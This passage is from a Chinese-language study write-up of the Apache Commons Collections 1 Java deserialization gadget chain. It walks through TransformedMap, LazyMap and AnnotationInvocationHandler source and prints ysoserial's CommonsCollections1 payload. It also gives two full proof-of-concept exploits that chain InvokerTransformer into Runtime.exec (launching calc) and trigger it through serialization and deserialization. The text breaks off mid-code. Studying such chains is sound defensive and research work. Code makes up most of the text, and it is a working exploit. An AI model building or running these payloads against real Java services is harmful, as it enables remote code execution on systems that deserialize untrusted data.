<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// AbstractMapDecorator</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">AbstractMapDecorator</span><span class="params">(Map map)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (map == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Map must not be null&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.map = map;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后通过调用<code>put</code>传入新的映射在<code>transformValue</code>产生回调</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">put</span><span class="params">(Object key, Object value)</span> </span>&#123;</span><br><span class="line">    key = <span class="keyword">this</span>.transformKey(key);</span><br><span class="line">    value = <span class="keyword">this</span>.transformValue(value);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.getMap().put(key, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">transformValue</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.valueTransformer == <span class="keyword">null</span> ? object : <span class="keyword">this</span>.valueTransformer.transform(object);</span><br><span class="line">    <span class="comment">// 实现调用 transformerChain.transform(String)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实现调用<code>ChainedTransformer.transform</code>，之后根据<code>this.iTransformers[i]</code>依次调用<code>ConstantTransformer.transform</code>|<code>InvokerTransformer.transform</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// InvokerTransformer.transform </span></span><br><span class="line"><span class="comment">// invoke实现任意方法执行</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Class cls = input.getClass();</span><br><span class="line">            Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">       </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h4><p>虽然上面的demo在本地运行的时候是可以的，但是我们最终是要通过反序列化去实现任意代码执行的，所以我们要通过<code>readObject</code>去实现回调，那么这里就是用到了<code>AnnotationInvocationHandler</code>类</p>
<p>直接来看一下这个类的<code>readObject</code>方法（8u66</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    var1.defaultReadObject(); <span class="comment">// 单纯调用一份方法 var1在后面都没有被调用</span></span><br><span class="line">    AnnotationType var2 = <span class="keyword">null</span>; <span class="comment">// 初始化</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var2 = AnnotationType.getInstance(<span class="keyword">this</span>.type); <span class="comment">// 获取我们传进去的类 Retention.class</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map var3 = var2.memberTypes(); <span class="comment">// 返回memberTypes</span></span><br><span class="line">    Iterator var4 = <span class="keyword">this</span>.memberValues.entrySet().iterator(); <span class="comment">// 通过我们传进去的Map进行操作 outerMap</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">        Entry var5 = (Entry)var4.next(); </span><br><span class="line">        String var6 = (String)var5.getKey(); <span class="comment">// 获取键值</span></span><br><span class="line">        Class var7 = (Class)var3.get(var6); <span class="comment">//this.memberTypes.get =&gt; Map.get 获取key为var6的value 否则为null</span></span><br><span class="line">        <span class="keyword">if</span> (var7 != <span class="keyword">null</span>) &#123; <span class="comment">// 不能为null 所以前面的var4</span></span><br><span class="line">            Object var8 = var5.getValue(); <span class="comment">// 获取key所映射的value</span></span><br><span class="line">            <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                <span class="comment">// 设置新的value</span></span><br><span class="line">                var5.setValue(</span><br><span class="line">                    (<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)</span><br><span class="line">                    ).setMember(</span><br><span class="line">                        (Method)var2.members().get(var6)</span><br><span class="line">                    ));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>获取我们传入的被<code>TransformedMap</code>修饰过的Map，以及用来保证<code>var7</code>不为空的类。遍历Map里面的我们写入的代码，随后在setValue中触发<code>TransformedMap</code>的<code>transform</code>，从而实现任意代码执行 </p>
<p><del><em><strong>这里有个小问题</strong>：setValue是怎么实现触发transform的，虽然打断点之后走比较明显，但是还是有点不能理解，然后发现用反射传入的类在反序列化的时候，打断点调试的时候是不会走到这个类里面的，但是会到抽象类里面调用他执行的方法 感觉还是java基础不行</em></del>（已解决</p>
<blockquote>
<ul>
<li><p>sun.reflect.annotation.AnnotationInvocationHandler 构造函数的第一个参数必须是Annotation的子类，且其中必须含有至少一个方法，假设方法名是X</p>
</li>
<li><p>被 TransformedMap.decorate 修饰的Map中必须有一个键名为X的元素</p>
</li>
</ul>
</blockquote>
<p>exp:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC1ForP2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="comment">// getMethod(&quot;getRuntime&quot;)</span></span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;</span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="comment">// 方法名</span></span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="comment">// 参数类型</span></span><br><span class="line">                <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125; <span class="comment">// 参数</span></span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="comment">// =&gt; exec(&quot;calc&quot;)</span></span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> String[]&#123;<span class="string">&quot;calc&quot;</span>&#125;</span><br><span class="line">            ),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers); <span class="comment">// 将上面的串联起来 前面的返回值进行回调</span></span><br><span class="line"></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// serialize</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(barr);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// deserialize</span></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h4><p>在ysoserial中使用的是LazyMap对<code>transformerChain</code>进行修饰，因为P神的demo已经能大概看懂了，那么现在直接去看ysoserial的CC1吧</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections1</span> <span class="keyword">extends</span> <span class="title">PayloadRunner</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">InvocationHandler</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> InvocationHandler <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> String[] &#123; command &#125;; <span class="comment">// 执行的参数</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// inert chain for setup</span></span><br><span class="line">      <span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(</span><br><span class="line">         <span class="keyword">new</span> Transformer[]&#123; <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// real chain for after setup</span></span><br><span class="line">       <span class="comment">// 实现调用Runtime.getRuntime.exec(command)</span></span><br><span class="line">      <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">               String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">               <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">               Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">               <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">               <span class="keyword">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">final</span> Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">final</span> InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class="line"></span><br><span class="line">      Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); <span class="comment">// arm with actual transformer chain</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> handler;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      PayloadRunner.run(CommonsCollections1.class, args);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isApplicableJavaVersion</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> JavaVersion.isAnnInvHUniversalMethodImpl();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>和P神的demo主要区别就在<code>lazyMap</code>，还有这里利用了动态代理（对象代理）（如果我没理解错，应该就是前面的动态代理</p>
<p>然后我们也可以看出来<code>TransformedMap</code>和<code>LazyMap</code>的区别就在于，<code>TransformedMap</code>通过put映射而产生回调，但是<code>LazyMap</code>很明显就不是，那么现在来具体分析一下<code>LazyMap</code>的工作流程（雾</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LazyMap</span> <span class="keyword">extends</span> <span class="title">AbstractMapDecorator</span> <span class="keyword">implements</span> <span class="title">Map</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">7990956402564206740L</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer factory;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Factory factory)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> LazyMap(map, factory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer factory)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> LazyMap(map, factory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">LazyMap</span><span class="params">(Map map, Factory factory)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.factory = FactoryTransformer.getInstance(factory);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">LazyMap</span><span class="params">(Map map, Transformer factory)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.factory = factory;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream out)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        out.defaultWriteObject();</span><br><span class="line">        out.writeObject(<span class="keyword">super</span>.map);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        <span class="keyword">super</span>.map = (Map)in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">            Object value = <span class="keyword">this</span>.factory.transform(key);</span><br><span class="line">            <span class="keyword">super</span>.map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">super</span>.map.get(key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以发现<code>LazyMap</code>会在get方法会在判断当map不包含<code>key</code>的时候会调用<code>transform</code>方法，并且传入key当作参数，而之前的链子就是调用<code>transform</code>之后达到命令执行的，那么显而易见只要多次调用get方法就应该可以实现</p>
<p>但是要怎么调用<code>get</code>方法呢</p>
<p>我们跟进，试着读一下代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br><span class="line"><span class="keyword">final</span> InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class="line">Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br></pre></td></tr></table></figure>

<p>在<code>Gadgets</code>中利用动态代理实例化AnnotationInvocationHandler从而动态代理且自动调用<code>AnnotationInvocationHandler</code>重写的invoke方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">createMemoitizedProxy</span> <span class="params">( <span class="keyword">final</span> Map&lt;String, Object&gt; map, <span class="keyword">final</span> Class&lt;T&gt; iface, <span class="keyword">final</span> Class&lt;?&gt;... ifaces )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 我们传入的是lazyMap修饰之后的hashMap和Transformer 还有Map.class</span></span><br><span class="line">    <span class="keyword">return</span> createProxy(createMemoizedInvocationHandler(map), iface, ifaces);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> InvocationHandler <span class="title">createMemoizedInvocationHandler</span> <span class="params">( <span class="keyword">final</span> Map&lt;String, Object&gt; map )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// ANN_INV_HANDLER_CLASS是一个常量，值为AnnotationInvocationHandler完整的类名 </span></span><br><span class="line">    <span class="comment">// 说明这里就相当于是实例化了这个类 然后传入map使得this.memberValues = lazyMap;</span></span><br><span class="line">    <span class="keyword">return</span> (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">createProxy</span> <span class="params">( <span class="keyword">final</span> InvocationHandler ih, <span class="keyword">final</span> Class&lt;T&gt; iface, <span class="keyword">final</span> Class&lt;?&gt;... ifaces )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> Class&lt;?&gt;[] allIfaces = (Class&lt;?&gt;[]) Array.newInstance(Class.class, ifaces.length + <span class="number">1</span>);</span><br><span class="line">    allIfaces[ <span class="number">0</span> ] = iface;</span><br><span class="line">    <span class="keyword">if</span> ( ifaces.length &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">            System.arraycopy(ifaces, <span class="number">0</span>, allIfaces, <span class="number">1</span>, ifaces.length);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih)); <span class="comment">// 动态代理</span></span><br><span class="line">    </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>AnnotationInvocationHandler</code>的<code>invoke</code>方法，我们可以发现在这里会调用<code>LazyMap</code>的get方法</p>
<p><del><em>但是这里的参数是怎么传进去的呢？ 打断点调试了一下发现是通过entrySet调用invoke的，但是哪里调用的entrySet从而导致调用的invoke呢？</em></del>（已解决</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object var1, Method var2, Object[] var3)</span> </span>&#123;</span><br><span class="line">    String var4 = var2.getName();</span><br><span class="line">   ……</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(var7) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.toStringImpl();</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.hashCodeImpl();</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.type;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            Object var6 = <span class="keyword">this</span>.memberValues.get(var4);</span><br><span class="line">            <span class="keyword">if</span> (var6 == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IncompleteAnnotationException(<span class="keyword">this</span>.type, var4);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var6 <span class="keyword">instanceof</span> ExceptionProxy) &#123;</span><br><span class="line">                <span class="keyword">throw</span> ((ExceptionProxy)var6).generateException();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (var6.getClass().isArray() &amp;&amp; Array.getLength(var6) != <span class="number">0</span>) &#123;</span><br><span class="line">                    var6 = <span class="keyword">this</span>.cloneArray(var6);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> var6;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>因为比较菜，所以就打断点之后写下步骤：</p>
<p>1.先进入LazyMap的readObject、decorate，使得<code>this.factory=transformerChain;super.map=HashMap()</code></p>
<p>2.<code>super.map = (Map)in.readObject()</code>，打断可以发现，下一个反序列化的类应该是<code>AnnotationInvocationHandler</code>，但是由于是通过反射实例化的，所以没有直接显示出来（大概），进入<code>AnnotationInvocationHandler</code>的readObject，在<code>Iterator var4 = this.memberValues.entrySet().iterator();</code>调用到了<code>LazyMap.entrySet()</code>之后转到<code>entrySet</code></p>
<p>3.之后调用<code>AnnotationInvocationHandler</code>的invoke方法，其中方法名为<code>entrySet</code>，<code>this.memberValues=LazyMap</code>，从而调用LazyMap.get</p>
<p>（之后的就和之前的差不多了，不过这其中有些比较具体的步骤都是我自己打断点调试猜测的，所以如果不正确期待师傅们的指正</p>
</blockquote>
<p><strong>P神更新的demo:</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC1</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class,Class[].class &#125;, </span><br><span class="line">                               <span class="keyword">new</span> Object[] &#123; <span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class,Object[].class &#125;, </span><br><span class="line">                               <span class="keyword">new</span> Object[] &#123; <span class="keyword">null</span>, newObject[<span class="number">0</span>] &#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123; String.class&#125;,</span><br><span class="line">                               <span class="keyword">new</span> String[] &#123; <span class="string">&quot;calc.exe&quot;</span> &#125;),&#125;;</span><br><span class="line"></span><br><span class="line">    Transformer transformerChain = <span class="keyword">new</span>	ChainedTransformer(transformers);</span><br><span class="line">    Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">    </span><br><span class="line">    Map outerMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">    Class clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">    Constructor construct = clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">    construct.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    InvocationHandler handler = (InvocationHandler)construct.newInstance(Retention.class, outerMap);</span><br><span class="line">    Map proxyMap = (Map)Proxy.newProxyInstance(Map.class.getClassLoader(), </span><br><span class="line">                                               <span class="keyword">new</span> Class[] 